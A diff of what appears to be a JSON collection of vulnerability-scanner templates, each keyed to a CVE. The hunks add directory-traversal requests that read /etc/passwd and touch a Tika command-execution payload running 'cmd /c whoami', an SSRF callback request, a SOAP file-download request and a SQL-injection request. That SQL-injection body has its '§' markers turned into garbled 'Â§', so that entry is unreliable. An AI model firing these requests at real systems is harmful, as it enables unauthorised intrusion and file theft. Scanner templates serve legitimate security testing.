@@ -6066,11 +6066,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Expect": "100-continue",
+            "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -6458,6 +6458,21 @@
       ]
     },
     {
+      "id": "CVE-2018-16716",
+      "info": {
+        "name": "NCBI ToolBox - Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/blast/nph-viewgif.cgi?../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-16763",
       "info": {
         "name": "fuelCMS 1.4.1 - Remote Code Execution",
@@ -6631,6 +6646,21 @@
           "raw": [
             "GET / HTTP/1.1\nHost: {{Hostname}}\nCookie: lang=en-US; i_like_gogits=../../../../etc/passwd;\n",
             "GET / HTTP/1.1\nHost: {{Hostname}}\nCookie: lang=en-US; i_like_gogits=../../../../etc/dummy;\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-19365",
+      "info": {
+        "name": "Wowza Streaming Engine Manager Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/enginemanager/server/logs/download?logType=error&logName=../../../../../../../../etc/passwd&logSource=engine"
           ]
         }
       ]
@@ -8845,8 +8875,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -10470,9 +10500,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -14424,8 +14454,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
@@ -15224,7 +15254,7 @@
     {
       "id": "CVE-2021-41878",
       "info": {
-        "name": "i-Panel Administration System - Reflected XSS",
+        "name": "i-Panel Administration System - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15239,7 +15269,7 @@
     {
       "id": "CVE-2021-41951",
       "info": {
-        "name": "Resourcespace - Reflected XSS",
+        "name": "Resourcespace - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15283,14 +15313,14 @@
     {
       "id": "CVE-2021-42258",
       "info": {
-        "name": "BillQuick Web Suite SQLi",
+        "name": "BillQuick Web Suite SQL Injection",
         "severity": "critical"
       },
       "requests": [
         {
           "raw": [
             "GET / HTTP/1.1\nHost: {{Hostname}}\n",
-            "POST / HTTP/1.1\nHost: {{Hostname}}\nReferer: {{BaseURL}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\n\n__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE={{url_encode(\"§VS§\")}}&__VIEWSTATEGENERATOR={{url_encode(\"§VSG§\")}}&__EVENTVALIDATION={{url_encode(\"§EV§\")}}&txtID=uname%27&txtPW=passwd&hdnClientDPI=96\n"
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nReferer: {{BaseURL}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\n\n__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE={{url_encode(\"Â§VSÂ§\")}}&__VIEWSTATEGENERATOR={{url_encode(\"Â§VSGÂ§\")}}&__EVENTVALIDATION={{url_encode(\"Â§EVÂ§\")}}&txtID=uname%27&txtPW=passwd&hdnClientDPI=96\n"
           ]
         }
       ]
@@ -15298,7 +15328,7 @@
     {
       "id": "CVE-2021-42551",
       "info": {
-        "name": "NetBiblio WebOPAC - Reflected XSS",
+        "name": "NetBiblio WebOPAC - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15314,7 +15344,7 @@
     {
       "id": "CVE-2021-42565",
       "info": {
-        "name": "myfactory FMS  -  Reflected XSS",
+        "name": "myfactory FMS  -  Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
